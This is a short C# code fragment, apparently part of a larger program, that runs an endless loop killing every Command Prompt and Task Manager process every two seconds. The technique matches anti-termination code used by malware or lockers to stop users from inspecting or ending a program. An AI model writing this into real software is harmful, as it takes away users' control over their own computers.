    while(true){
        foreach (Process proc in Process.GetProcessesByName("cmd"))
        {
            proc.Kill();
        }
        foreach (Process proc in Process.GetProcessesByName("taskmgr"))
        {
            proc.Kill();
        }
        // Sleep for 2 seconds, so that the program does not do this too often.
        Thread.Sleep(2000);
    }
    
